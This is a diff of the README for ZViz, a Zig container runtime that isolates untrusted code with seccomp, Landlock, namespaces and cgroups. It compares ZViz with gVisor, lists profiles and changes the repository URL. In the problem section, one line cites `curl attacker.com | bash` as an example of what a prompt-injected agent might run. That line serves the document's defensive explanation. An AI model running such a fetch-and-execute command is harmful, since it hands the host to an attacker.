@@ -1,170 +1,167 @@
 # ZViz
 
 [![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Platform](https://img.shields.io/badge/platform-Linux-green.svg)](https://github.com/Skelf-Research/zviz)
+[![Platform](https://img.shields.io/badge/platform-Linux-green.svg)](https://github.com/AIntheSky/zviz)
 
-**High-performance container isolation with gVisor-grade security**
+**Container isolation for code you can't trust but have to run.**
 
-ZViz is a Zig-based container runtime that delivers strong security guarantees with near-native performance. It achieves 98.2% policy compatibility with gVisor without a userspace kernel, using layered Linux kernel primitives instead.
+---
 
-## Security Results
+## The Problem
 
-Validated with live testing (same OCI bundle in both runtimes):
+You're running code you didn't write. Maybe it's:
 
-| Metric | ZViz | gVisor |
-|--------|------|--------|
-| Escape tests blocked | **19/19 (100%)** | 11/19 (58%) |
-| Security attacks blocked | 8/8 | 6/8* |
-| Policy compatibility | 98.2% (54/55 checks match) | |
+- **AI agents** executing LLM-generated code (one prompt injection away from `curl attacker.com | bash`)
+- **CI/CD pipelines** running `npm install` on packages with 47 transitive dependencies you've never audited
+- **Third-party plugins** that "need shell access" to work
+- **Multi-tenant workloads** where one customer's code runs next to another's
 
-*gVisor "allows" ptrace and host writes via emulation (safe but different philosophy).
+Traditional containers give you a false sense of security. A container is just namespaces and cgroups - the kernel attack surface is still fully exposed. Every `runc` escape CVE is a reminder that "containerized" isn't a security strategy.
 
-**Key difference**: ZViz blocks dangerous syscalls outright (EPERM). gVisor emulates them safely in userspace. Both achieve isolation - ZViz is stricter, gVisor is more compatible.
+gVisor solves this with a userspace kernel that emulates syscalls. It works, but at a cost: 5-250x syscall overhead, ~200ms cold starts, and 50MB per container. For high-throughput APIs or serverless functions, that's a dealbreaker.
 
-## Why ZViz?
+## The Solution
 
-**The Problem**: Running untrusted code requires strong isolation. Traditional containers (runc) share the kernel attack surface. gVisor provides excellent isolation but with significant performance overhead from syscall emulation.
-
-**The Solution**: ZViz uses layered kernel enforcement instead of syscall emulation:
-
-| Layer | Mechanism | Purpose |
-|-------|-----------|---------|
-| 1. Namespaces | user, pid, mount, ipc, uts | Resource isolation |
-| 2. Seccomp-BPF | 124-instruction filter (90 allow, 22 deny) | Syscall filtering |
-| 3. Capabilities | All 41 capabilities dropped | Privilege reduction |
-| 4. Landlock LSM | Filesystem access rules | Object-level access control |
-| 5. cgroups v2 | memory, cpu, pids | Resource limits |
-
-## Performance
-
-| Metric | ZViz | gVisor | runc (baseline) |
-|--------|------|--------|-----------------|
-| Cold start | ~8ms | ~200ms | ~50ms |
-| Allowed syscall overhead | ~0 | +50-100us | ~0 |
-| Memory per container | ~2MB | ~50MB | ~0 |
-| I/O throughput | ~95% native | ~40% native | 100% |
-| CPU-bound workload | ~99% native | ~95% native | 100% |
-
-### Measured Syscall Latency
-
-Benchmark results from running same binary in both runtimes (`./demo.sh --perf`):
-
-| Syscall | ZViz | gVisor | Speedup |
-|---------|------|--------|---------|
-| getpid | 297ns | 1,209ns | 4.1x |
-| getuid | 202ns | 1,125ns | 5.6x |
-| clock_gettime | 20ns | 4,982ns | **249x** |
-| read | 212ns | 4,393ns | **20.7x** |
-| write | 211ns | 1,169ns | 5.5x |
-
-ZViz's allowed syscalls execute at native kernel speed. gVisor emulates everything through its userspace Sentry, which is why `clock_gettime` is 249x slower (can't use kernel vDSO).
-
-## Comparison with gVisor
-
-ZViz achieves gVisor-equivalent security outcomes through a fundamentally different architecture:
+ZViz provides gVisor-grade isolation without the performance tax. Instead of emulating syscalls, it enforces security through layered kernel primitives:
 
 ```
 gVisor:  App → Sentry (emulates ~300 syscalls) → Host kernel (~70 syscalls)
-ZViz:    App → BPF filter → ALLOW (90, native) / DENY (22) / BROKER (5, mediated)
+ZViz:    App → BPF filter → ALLOW (90, native speed) / DENY (22) / BROKER (5, mediated)
 ```
 
-**Different security philosophies**:
-- **ZViz**: Blocks dangerous syscalls with EPERM (19/19 escape tests blocked). Exploit code fails immediately.
-- **gVisor**: Emulates syscalls in userspace Sentry (11/19 blocked, 8/19 emulated). Container "succeeds" but operations are sandboxed.
+Allowed syscalls execute at native kernel speed. Dangerous syscalls get blocked immediately (EPERM) or routed through a userspace broker for inspection.
 
-Both achieve strong isolation. When gVisor "allows" `ptrace()` or `mount()`, the container sees success but operates on Sentry's virtual environment, not the host. ZViz returns EPERM - the syscall never executes.
-
-**When gVisor's emulation matters**: Docker-in-Docker works in gVisor because nested Docker thinks it's creating real namespaces, but they're sandboxed in Sentry. ZViz blocks these syscalls outright, so nested containers won't work.
-
-The 1.8% policy gap is network egress: ZViz defaults to **deny**, gVisor defaults to allow.
-
-See [full comparison](documentation/docs/architecture/comparison.md) for detailed analysis including benchmark data, escape test breakdown, and comparisons with Kata Containers and Firecracker.
+**Result**: 98.2% policy compatibility with gVisor, 4-249x faster syscalls, ~8ms cold starts.
 
 ## Quick Start
 
 ```bash
-# Build from source (requires Zig 0.15.0+)
-git clone https://github.com/Skelf-Research/zviz.git
-cd zviz
-zig build -Doptimize=ReleaseSafe
+# Build (requires Zig 0.15.0+, Linux 5.13+)
+git clone https://github.com/AIntheSky/zviz.git
+cd zviz && zig build -Doptimize=ReleaseSafe
 
 # Run a container
 ./zig-out/bin/zviz run my-container /path/to/bundle
 
-# Run the demo (security tests + escape tests + performance)
-./demo.sh --all
+# Run with verbose mode (see which syscalls get blocked)
+./zig-out/bin/zviz --verbose run my-container /path/to/bundle
 
-# Validate system compatibility
-./zig-out/bin/zviz validate
+# Use a workload-specific profile
+./zig-out/bin/zviz --profile=web-server run my-api /path/to/bundle
+
+# Run the full security + performance test suite
+./demo.sh --all
 ```
 
-## Choosing the Right Runtime
+## AI Agents & Agentic Workloads
 
-| Use Case | Recommended | Why |
-|----------|-------------|-----|
-| **Running untrusted code** | ZViz | Blocks exploit chains at step 1 (EPERM) |
-| **Multi-tenant hostile users** | ZViz | Strictest policy, smallest attack surface |
-| **High-performance APIs/services** | ZViz | 4-249x faster syscalls than gVisor |
-| **Serverless / FaaS** | ZViz | ~8ms cold start vs gVisor's ~200ms |
-| **CI building Docker images** | gVisor | Needs nested namespaces/mounts |
-| **Debugging with strace** | gVisor | Needs ptrace for process tracing |
-| **Bazel / Nix builds** | gVisor | Internal sandboxing needs namespaces |
-| **Development/testing** | runc | No overhead, full compatibility |
+ZViz is built for the era of autonomous code execution:
 
-**Simple rule**: If your workload needs `ptrace`, `mount`, `unshare`, or Docker-in-Docker, use gVisor. Otherwise, ZViz is faster and stricter.
+| Scenario | Risk | ZViz Protection |
+|----------|------|-----------------|
+| **LLM code execution** | Model generates malicious code (prompt injection, hallucination) | Syscall filtering blocks escape attempts at kernel boundary |
+| **Agent tool use** | Agent calls shell commands, file operations | Landlock LSM restricts filesystem access, broker mediates dangerous ops |
+| **Agent spawning agents** | Recursive execution, resource exhaustion | cgroups v2 limits, PID caps, memory caps |
+| **Untrusted plugins/extensions** | Third-party code with unknown behavior | Full namespace isolation, all capabilities dropped |
 
-## Use Cases
+The `--verbose` flag shows exactly which syscalls are being blocked - essential for debugging agent workloads that hit unexpected restrictions.
 
-| Use Case | Why ZViz? |
-|----------|-----------|
-| **CI/CD Runners** | Isolated build environments for untrusted code, ~8ms cold start |
-| **Multi-tenant Platforms** | Strong isolation with 25x better density than gVisor |
-| **Plugin Execution** | Safe execution of third-party extensions |
-| **High-Performance Computing** | Near-zero overhead on allowed syscalls |
+## Built-in Profiles
 
-## Architecture
+Choose a profile based on your workload:
 
-ZViz enforces security through five layers applied in the container child process:
+```bash
+zviz --profile=<name> run container /path/to/bundle
+```
 
-1. **Namespaces**: User, PID, mount, IPC, UTS isolation via `unshare()`
-2. **Capabilities**: All 41 Linux capabilities dropped via `prctl(PR_CAPBSET_DROP)`
-3. **Landlock**: Filesystem access rules (read-only rootfs, writable /tmp and /work only)
-4. **Seccomp-BPF**: 124-instruction filter classifying all syscalls into allow/deny/broker
-5. **cgroups v2**: Memory, PID, and CPU limits
+| Profile | Use Case | Key Characteristics |
+|---------|----------|---------------------|
+| `ci-runner` | CI/CD, build systems | Default profile, balanced security |
+| `web-server` | HTTP APIs, services | Network allowed, socket ops optimized |
+| `batch-job` | Data processing, ETL | No network, high memory limit (8G) |
+| `hostile-tenant` | Untrusted user code | Maximum restrictions |
+| `development` | Debugging | Allows ptrace - **NOT for production** |
 
-The ordering matters: capabilities are dropped before seccomp loads, and Landlock is applied before seccomp to ensure the security setup syscalls themselves aren't blocked.
+## When to Use gVisor Instead
+
+ZViz blocks dangerous syscalls outright. gVisor emulates them in a sandboxed userspace kernel. Both achieve isolation - but the approach matters for compatibility:
+
+| If your workload needs... | Use | Why |
+|---------------------------|-----|-----|
+| `ptrace` (strace, debuggers) | gVisor | ZViz blocks it; gVisor emulates safely |
+| `mount` / `unshare` (Docker-in-Docker) | gVisor | Nested containers need namespace syscalls |
+| Bazel / Nix builds | gVisor | Internal sandboxing creates namespaces |
+| Maximum syscall performance | **ZViz** | Native speed vs 5-250x emulation overhead |
+| Fast cold starts (serverless) | **ZViz** | ~8ms vs ~200ms |
+| Strictest policy (block, don't emulate) | **ZViz** | Exploit code fails immediately |
+
+**Simple rule**: If you need nested containers or process tracing, use gVisor. Otherwise, ZViz is faster and stricter.
+
+## Security Validation
+
+Tested against real escape techniques and attack vectors:
+
+| Metric | ZViz | gVisor |
+|--------|------|--------|
+| Escape tests blocked | **19/19 (100%)** | 11/19 (58%)* |
+| Security attacks blocked | 8/8 | 6/8* |
+| Policy compatibility | 98.2% (54/55 checks) | baseline |
+
+*gVisor "allows" some syscalls (ptrace, mount) but emulates them safely in userspace. Different philosophy, equivalent security outcome for those operations.
+
+The 1.8% policy gap: ZViz defaults network egress to **deny**. gVisor allows it.
+
+## Performance
+
+| Metric | ZViz | gVisor | runc |
+|--------|------|--------|------|
+| Cold start | ~8ms | ~200ms | ~50ms |
+| Memory per container | ~2MB | ~50MB | ~0 |
+| I/O throughput | ~95% native | ~40% native | 100% |
+
+### Syscall Latency (measured)
+
+| Syscall | ZViz | gVisor | Speedup |
+|---------|------|--------|---------|
+| getpid | 297ns | 1,209ns | 4.1x |
+| clock_gettime | 20ns | 4,982ns | **249x** |
+| read | 212ns | 4,393ns | **20.7x** |
+| write | 211ns | 1,169ns | 5.5x |
+
+ZViz's allowed syscalls hit the kernel directly. gVisor routes everything through its Sentry process.
+
+## How It Works
+
+Five enforcement layers, applied in order:
+
+| Layer | Mechanism | Purpose |
+|-------|-----------|---------|
+| 1 | **Namespaces** (user, pid, mount, ipc, uts) | Resource isolation |
+| 2 | **Capabilities** (all 41 dropped) | Privilege elimination |
+| 3 | **Landlock LSM** | Filesystem access control |
+| 4 | **Seccomp-BPF** (124 instructions) | Syscall filtering |
+| 5 | **cgroups v2** | Resource limits (memory, PIDs, CPU) |
+
+The ordering matters: capabilities drop before seccomp loads, Landlock applies before seccomp so security setup syscalls aren't self-blocked.
 
 ## Documentation
 
 | Document | Description |
 |----------|-------------|
 | [Architecture](documentation/docs/architecture/index.md) | System design and enforcement layers |
-| [Comparison](documentation/docs/architecture/comparison.md) | Detailed comparison with gVisor, runc, Kata, Firecracker |
-| [Performance](documentation/docs/architecture/performance.md) | Measured benchmarks and overhead analysis |
+| [Comparison](documentation/docs/architecture/comparison.md) | ZViz vs gVisor vs Kata vs Firecracker |
 | [Threat Model](documentation/docs/architecture/threat-model.md) | Security goals and assumptions |
-| [Enforcement Model](documentation/docs/architecture/enforcement-model.md) | Five-layer enforcement architecture |
+| [Performance](documentation/docs/architecture/performance.md) | Benchmark methodology and results |
 
 ## Requirements
 
-- **Linux kernel >= 5.13** (Landlock LSM support)
-- **cgroups v2** enabled
-- **Zig 0.15.0+** for building from source
-
-## Security
-
-ZViz earns trust through:
-
-- Live security testing (8 attack vectors verified blocked in every demo run)
-- 19-point escape test suite (namespace, capability, seccomp, filesystem, network, resource)
-- 98.2% policy compatibility with gVisor (validated via `zviz compare`)
-- Generated, auditable BPF filters (124 instructions, fully deterministic)
-- Layered enforcement (no single point of failure)
-
-See [SECURITY.md](SECURITY.md) for reporting vulnerabilities.
+- Linux kernel >= 5.13 (Landlock LSM)
+- cgroups v2 enabled
+- Zig 0.15.0+ (build from source)
 
 ## Contributing
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
 
 ## License
 
